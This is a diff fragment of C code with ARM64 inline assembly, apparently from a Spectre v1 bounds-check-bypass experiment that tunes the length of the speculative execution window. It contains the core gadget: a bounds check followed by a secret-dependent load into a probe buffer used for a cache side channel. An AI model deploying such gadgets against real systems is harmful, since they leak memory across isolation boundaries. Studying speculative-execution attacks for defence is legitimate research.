@@ -18,37 +18,29 @@ unsigned char aligned_buffer1[4096];
 unsigned int **index_p2 = &index_p1;
 unsigned char aligned_buffer2[4096];
 unsigned int ***index_p3 = &index_p2;
-uint64_t counter = 256;
 
 volatile uint8_t pick = 0; 
-void func(void){
-	//do nothing
-	asm volatile(
-			"ldr x10, %[data]\n"
-			".rept 10\n"
-			"adds x10, x10, 1\n"
-			".endr\n"
-			:: [data] "m" (counter)
-	);
-	
-	return;
-}
-void spectre_v1(register size_t index) {
+uint64_t counter = 0;
+
+void spectre_v1( size_t index) {
 
 	asm volatile(
-			"ldr x10, %[data]\n"
-			:: [data] "m" (counter)
-	);
-
-	if (index < ***index_p3)
+    	"ldr x10, %[counter]\n"
+		"mov x11, 2\n"
+        :: [counter] "m" (counter)
+    );
+	if (index < size)
 	{	
 		asm volatile(
-			".rept 1122\n"
-			//"adds x10, x10, #1\n"
-			//"eor x10, x10, #1\n"
-			"nop\n"
+			".rept 1125\n"                 
+		//	"adds x10, x10, x11\n"          //execution window 1135
+			"nop\n"							//execution window 1135
+		//	"sdiv x10, x10, x11\n"			//execution window 10
 			".endr\n"
 		);
+//		asm volatile(
+//			"ldr x12, [x10, ]"
+//		);
 		pick = reloadbuffer[fake_buffer[index] << 12];
 	}
 }
